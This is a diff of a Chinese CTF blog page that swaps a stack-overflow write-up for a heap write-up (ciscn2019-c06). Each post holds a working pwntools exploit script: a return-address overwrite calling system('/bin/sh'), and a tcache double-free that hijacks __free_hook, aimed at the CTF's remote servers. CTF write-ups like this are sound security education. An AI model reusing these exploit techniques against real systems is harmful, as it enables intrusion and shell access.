@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta name="description" content="国赛时坐在五号机旁边看着他搓出来的，五号机tql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-stackoverflow">
-<meta property="og:url" content="http://yoursite.com/2018/10/03/cgctf-stackoverflow/index.html">
+<meta property="og:title" content="ciscn2019-c06">
+<meta property="og:url" content="http://yoursite.com/2019/08/09/ciscn2019-c06/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta property="og:description" content="国赛时坐在五号机旁边看着他搓出来的，五号机tql">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-05T15:36:34.483Z">
+<meta property="og:updated_time" content="2019-08-09T15:09:08.684Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-stackoverflow">
-<meta name="twitter:description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta name="twitter:title" content="ciscn2019-c06">
+<meta name="twitter:description" content="国赛时坐在五号机旁边看着他搓出来的，五号机tql">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CGCTF-stackoverflow | 4eriri&#39;s blog</title>
+<title>ciscn2019-c06 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +196,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-cgctf-stackoverflow" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ciscn2019-c06" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/03/cgctf-stackoverflow/" class="article-date">
-      <time datetime="2018-10-03T11:34:16.000Z" itemprop="datePublished">2018-10-03</time>
+      <a href="/2019/08/09/ciscn2019-c06/" class="article-date">
+      <time datetime="2019-08-09T14:54:48.000Z" itemprop="datePublished">2019-08-09</time>
 </a>
 
 
@@ -215,7 +215,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CGCTF-stackoverflow
+      ciscn2019-c06
     </h1>
   
 
@@ -232,15 +232,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p>
-<p>拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了</p>
-<p>message函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+18h] [ebp-30h]</span><br><span class="line"></span><br><span class="line">n = 10;</span><br><span class="line">puts(&quot;you can leave some message here:&quot;);</span><br><span class="line">fgets(A, 60, stdin);</span><br><span class="line">puts(&quot;your name please:&quot;);</span><br><span class="line">fgets(&amp;s, n, stdin);</span><br><span class="line">return puts(&quot;Thank you&quot;);</span><br></pre></td></tr></table></figure>
-<p>a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;182.254.217.142&apos;,10001)</span><br><span class="line">sh.recvuntil(&apos;your choice:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;you can leave some message here:&apos;)</span><br><span class="line">payload=&apos;/bin/sh\0&apos;+&apos;a&apos;*40</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;your name please:&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>随后按照题目提示进入目录cat flag即可</p>
-
+        <p>国赛时坐在五号机旁边看着他搓出来的，五号机tql</p>
+<a id="more"></a>
+<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">welcome to babyheap</span><br><span class="line">1. add</span><br><span class="line">2. remove</span><br><span class="line">choice &gt;</span><br></pre></td></tr></table></figure>
+<p>C++写的程序，只有add和remove两个功能，但是在add时会打印出分配的堆地址。remove的时候free之后没有置0，存在UAF。</p>
+<p>此外，C++程序会为cin和cout分配两个堆，这一题就是利用double free tcache申请到cout的堆，free之后直接进入unsortedbin。再利用add时打印地址leak出main_arena的地址。</p>
+<p>之后就是常规的修改freehook为system，free一个内容为/bin/sh的chunk。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *#sh = process(&apos;./ciscn_final_3.dms&apos;)libc = ELF(&apos;./libc.so.6&apos;)sh = remote(&quot;f.buuoj.cn&quot;,20232)def add(index, size, s):    sh.sendlineafter(&apos;choice &gt;&apos;, &apos;1&apos;)    sh.sendlineafter(&apos;input the index&apos;, str(index))    sh.sendlineafter(&apos;input the size&apos;, str(size))    sh.sendafter(&apos;now you can write something&apos;, s)def delete(index):    sh.sendlineafter(&apos;choice &gt;&apos;, &apos;2&apos;)    sh.sendlineafter(&apos;input the index&apos;, str(index))add(0,0x70,&quot;/bin/sh\x00&quot;)sh.recvuntil(&quot;gift :&quot;)chunk0addr=int(sh.recv(14),16)leakchunk=chunk0addr-0x11c20log.success(&quot;leakchunkaddr: &quot;+hex(leakchunk))add(1,0x10,&quot;1&quot;)delete(1)delete(1)add(2,0x10,p64(leakchunk+0x10))add(3,0x10,&apos;3&apos;)add(4,0x10,&apos;leakchunk1&apos;)add(5,0x20,&apos;5&apos;)delete(4)delete(5)delete(5)add(6,0x20,p64(leakchunk+0x10))add(7,0x20,&apos;7&apos;)add(8,0x20,&apos;8&apos;)add(9,0x20,&apos;leakchunk2&apos;)sh.recvuntil(&quot;gift :&quot;)leakchunk2addr=int(sh.recv(14),16)freehook=leakchunk2addr+0x1c48log.success(&quot;freehook: &quot;+hex(freehook))system=freehook-libc.sym[&apos;__free_hook&apos;]+libc.sym[&apos;system&apos;]log.success(&quot;system: &quot;+hex(system))add(10,0x30,&apos;10&apos;)delete(10)delete(10)add(11,0x30,p64(freehook))add(12,0x30,&apos;12&apos;)add(13,0x30,p64(system))delete(0)#gdb.attach(sh)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -248,13 +246,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/03/cgctf-stackoverflow/">CGCTF-stackoverflow</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/09/ciscn2019-c06/">ciscn2019-c06</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-03, 19:34:16</p>
-        <p><span>最后更新:</span>2019-03-05, 23:36:34</p>
+        <p><span>发布时间:</span>2019-08-09, 22:54:48</p>
+        <p><span>最后更新:</span>2019-08-09, 23:09:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/03/cgctf-stackoverflow/" title="CGCTF-stackoverflow">http://yoursite.com/2018/10/03/cgctf-stackoverflow/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/cgctf-stackoverflow/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/09/ciscn2019-c06/" title="ciscn2019-c06">http://yoursite.com/2019/08/09/ciscn2019-c06/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/09/ciscn2019-c06/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -266,16 +264,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/08/bugku-re-1/">
-                    bugku-re-1
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/03/十一欢乐赛-pwn4/">
-                    十一欢乐赛-pwn4
+                <a href="/2019/08/06/ciscn-2019-es-1/">
+                    ciscn_2019_es_1
                 </a>
             </div>
         
@@ -287,7 +279,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -323,7 +315,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CGCTF-stackoverflow　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ciscn2019-c06　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -342,8 +334,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/10/03/cgctf-stackoverflow/';
-            this.page.identifier = '2018/10/03/cgctf-stackoverflow/';
+            this.page.url = 'http://yoursite.com/2019/08/09/ciscn2019-c06/';
+            this.page.identifier = '2019/08/09/ciscn2019-c06/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -365,15 +357,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/08/bugku-re-1/" title="上一篇: bugku-re-1">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/03/十一欢乐赛-pwn4/" title="下一篇: 十一欢乐赛-pwn4">
+            <a href="/2019/08/06/ciscn-2019-es-1/" title="下一篇: ciscn_2019_es_1">
                 <i class="fa fa-angle-right"></i>
             </a>
         
